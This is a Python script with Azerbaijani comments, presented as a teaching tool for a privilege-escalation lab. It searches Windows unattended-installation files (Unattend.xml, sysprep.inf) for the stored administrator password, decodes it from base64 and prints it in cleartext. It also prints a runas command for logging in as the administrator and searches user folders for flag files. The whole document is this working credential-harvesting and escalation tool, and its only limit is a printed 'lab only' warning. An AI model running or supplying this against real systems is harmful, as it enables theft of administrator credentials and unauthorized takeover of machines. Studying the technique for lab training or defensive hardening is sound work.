"""
extract_password.py
Windows Unattended Installation fayllarından şifrə çıxaran skript.
Privilege escalation lab tapşırığı üçün tədris skripti.
"""

import os
import re
import base64
import subprocess

# ─── 1. Hədəf fayl yolları ────────────────────────────────────────────────────
UNATTENDED_FILE_LOCATIONS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattended.xml",
    r"C:\Windows\System32\sysprep\sysprep.inf",
    r"C:\Windows\System32\sysprep\Unattend.xml",
    r"C:\Windows\system32\sysprep\Unattended.xml",
    r"C:\autounattend.xml",
    r"C:\Unattend.xml",
    r"C:\Windows\Panther\unattend\Unattended.xml",
]

# ─── 2. Faylları skan et ──────────────────────────────────────────────────────
def scan_for_unattended_files():
    """Mövcud unattended installation fayllarını tapır."""
    found_files = []
    print("[*] Unattended installation faylları axtarılır...\n")
    for file_path in UNATTENDED_FILE_LOCATIONS:
        if os.path.exists(file_path):
            print(f"[+] TAPILDI: {file_path}")
            found_files.append(file_path)
        else:
            print(f"[-] Tapılmadı: {file_path}")
    return found_files

# ─── 3. XML faylından şifrə çıxar ────────────────────────────────────────────
def extract_password_from_xml(file_path):
    """XML faylından AdministratorPassword dəyərini çıxarır."""
    print(f"\n[*] Analiz edilir: {file_path}")
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # AdministratorPassword blokunu tap
        admin_block = re.search(
            r"<AdministratorPassword>(.*?)</AdministratorPassword>",
            content,
            re.DOTALL | re.IGNORECASE
        )
        if not admin_block:
            print("[-] AdministratorPassword tapılmadı.")
            return None

        block_content = admin_block.group(1)

        # Value dəyərini çıxar
        value_match = re.search(
            r"<Value>(.*?)</Value>",
            block_content,
            re.DOTALL | re.IGNORECASE
        )
        if not value_match:
            print("[-] Value tagi tapılmadı.")
            return None

        raw_value = value_match.group(1).strip()
        print(f"[+] Xam dəyər tapıldı: {raw_value}")

        # PlainText statusunu yoxla
        plain_text_match = re.search(
            r"<PlainText>(.*?)</PlainText>",
            block_content,
            re.IGNORECASE
        )
        is_plain = True
        if plain_text_match:
            is_plain = plain_text_match.group(1).strip().lower() == "true"

        return raw_value, is_plain

    except PermissionError:
        print(f"[!] İcazə xətası: {file_path}")
        return None
    except Exception as e:
        print(f"[!] Xəta: {e}")
        return None

# ─── 4. Şifrəni decode et ────────────────────────────────────────────────────
def decode_password(raw_value, is_plain_text):
    """
    Şifrəni decode edir.
    PlainText=true  → açıq mətn
    PlainText=false → Base64 kodlanmış
    """
    if is_plain_text:
        print(f"[+] Açıq mətn şifrə: {raw_value}")
        return raw_value
    try:
        # UTF-8 ilə decode cəhdi
        decoded = base64.b64decode(raw_value).decode("utf-8", errors="ignore")
        print(f"[+] Base64 UTF-8 decode: {decoded}")

        # "AdministratorPassword" sonluğunu çıxar
        for suffix in ["AdministratorPassword", "Password"]:
            if decoded.endswith(suffix):
                decoded = decoded[:-len(suffix)]
                break

        print(f"[+] Əsl şifrə: {decoded}")
        return decoded
    except Exception as e:
        print(f"[!] Decode xətası: {e}")
        return raw_value

# ─── 5. Admin sessiyası aç və flag al ────────────────────────────────────────
def get_flag(username, password):
    """runas vasitəsilə admin sessiya açır və flag oxuyur."""
    print(f"\n[*] Admin sessiya açılır: {username}")

    # AutoLogon-dan username-i tap
    ps_find_user = """
    $xml = Get-Content 'C:\\Windows\\Panther\\Unattend.xml'
    $xml | Select-String 'Username'
    """
    result = subprocess.run(
        ["powershell", "-Command", ps_find_user],
        capture_output=True, text=True
    )
    print(f"[*] AutoLogon istifadəçisi: {result.stdout.strip()}")

    # Flag faylını tap
    ps_find_flag = """
    Get-ChildItem -Path C:\\Users\\ -Filter 'flag*' -Recurse -ErrorAction SilentlyContinue
    """
    result = subprocess.run(
        ["powershell", "-Command", ps_find_flag],
        capture_output=True, text=True
    )
    print(f"[*] Flag faylları:\n{result.stdout}")

# ─── 6. Əsas funksiya ────────────────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  Windows Unattended Files Privilege Escalation Skripti")
    print("  Yalnız icazəli lab mühitlərində istifadə edin!")
    print("=" * 60)

    # Addım 1: Faylları tap
    found_files = scan_for_unattended_files()
    if not found_files:
        print("\n[!] Heç bir unattended fayl tapılmadı.")
        return

    # Addım 2 & 3: Şifrə çıxar
    extracted_password = None
    admin_username = "SuperAdministrator"

    for file_path in found_files:
        result = extract_password_from_xml(file_path)
        if result:
            raw_value, is_plain = result
            # Addım 4: Decode et
            extracted_password = decode_password(raw_value, is_plain)
            break

    if not extracted_password:
        print("\n[!] Şifrə çıxarıla bilmədi.")
        return

    print(f"\n{'='*60}")
    print(f"[✓] ÇIXARILMIŞ ŞİFRƏ: {extracted_password}")
    print(f"[✓] İSTİFADƏÇİ: {admin_username}")
    print(f"{'='*60}\n")

    # Addım 5: Flag al
    get_flag(admin_username, extracted_password)

    print("\n[*] Əl ilə giriş üçün:")
    print(f'    runas /user:{admin_username} "powershell.exe"')
    print(f'    Şifrə: {extracted_password}')


if __name__ == "__main__":
    main()
